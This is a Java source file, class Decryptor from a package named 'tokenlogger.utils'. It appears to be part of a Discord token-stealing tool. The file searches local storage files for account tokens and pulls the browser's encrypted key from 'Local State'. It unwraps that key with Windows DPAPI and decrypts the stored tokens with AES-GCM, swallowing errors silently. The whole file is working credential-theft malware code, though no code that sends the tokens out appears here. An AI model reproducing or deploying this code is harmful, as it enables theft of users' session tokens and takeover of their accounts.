package tokenlogger.utils;

import java.io.BufferedReader;
import java.io.FileReader;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.File;
import java.nio.file.Paths;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.sun.jna.platform.win32.Crypt32Util;

public class Decryptor {
    private static final Pattern ENCRYPTED_TOKEN_REGEX = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
    public static final Pattern TOKEN_REGEX = Pattern.compile("[\\w-]{24,29}\\.[\\w-]{6}\\.[\\w-]{25,110}");
    private static final int ENCRYPTED_TOKEN_OFFSET = 12;
    private static final int DPAPI_OFFSET = 5;
    private static final int IV_OFFSET = 3;
    private static final int IV_SIZE = 12;
    private static final int PAYLOAD_OFFSET = 15;
    private static final int GCM_BIT_LENGTH = 128;

    public static Set<String> getTokens(String path) {
        Set<String> tokens = new HashSet<>();

        PathHelper.listValidFiles(path).forEach(file ->
                tokens.addAll(searchTokens(file))
        );

        return tokens;
    }

    public static Set<String> decryptTokens(String path, byte[] AESKey) {
        Set<String> decryptedTokens = new HashSet<>();

        for (byte[] decodedToken : listTokens(path)) {
            byte[] decryptedToken = new byte[IV_SIZE];
            System.arraycopy(decodedToken, IV_OFFSET, decryptedToken, 0, IV_SIZE);
            byte[] encryptedData = new byte[decodedToken.length - PAYLOAD_OFFSET];
            System.arraycopy(decodedToken, PAYLOAD_OFFSET, encryptedData, 0, encryptedData.length);

            try {
                Cipher GCM = Cipher.getInstance("AES/GCM/NoPadding");

                GCM.init(
                        Cipher.DECRYPT_MODE,
                        new SecretKeySpec(AESKey, "AES"),
                        new GCMParameterSpec(GCM_BIT_LENGTH, decryptedToken)
                );

                decryptedTokens.add(new String(GCM.doFinal(encryptedData)));
            } catch (Exception ignored) {
            }
        }

        return decryptedTokens;
    }

    public static byte[] getAESKey(String path) {
        try {
            Json localState = new Json(Paths.get(path, "Local State"));

            String encodedAESKey = localState.valueOf("encrypted_key");
            byte[] decodedAESKey = Base64.getDecoder().decode(encodedAESKey);
            byte[] encryptedAESKey = Arrays.copyOfRange(decodedAESKey, DPAPI_OFFSET, decodedAESKey.length);

            return Crypt32Util.cryptUnprotectData(encryptedAESKey);
        } catch (Exception ignored) {
        }

        return null;
    }

    private static List<byte[]> listTokens(String path) {
        List<byte[]> newTokens = new ArrayList<>();

        PathHelper.listValidFiles(path).forEach(file ->
            newTokens.addAll(decodeTokens(file))
        );

        return newTokens;
    }

    private static List<byte[]> decodeTokens(File file) {
        List<byte[]> decodedTokens = new ArrayList<>();

        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) {
                Matcher matcher = ENCRYPTED_TOKEN_REGEX.matcher(line);
                if (matcher.find()) {
                    String encodedToken = matcher.group().substring(ENCRYPTED_TOKEN_OFFSET);
                    byte[] decodedToken = Base64.getDecoder().decode(encodedToken);
                    decodedTokens.add(decodedToken);
                }
            }
        } catch (Exception ignored) {}

        return decodedTokens;
    }

    private static Set<String> searchTokens(File file) {
        Set<String> tokens = new HashSet<>();

        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) {
                Matcher matcher = TOKEN_REGEX.matcher(line);
                if (matcher.find())
                    tokens.add(matcher.group());
            }
        } catch (Exception ignored) {}

        return tokens;
    }

    public static String decode(String string) {
        return new String(Base64.getDecoder().decode(string));
    }
}
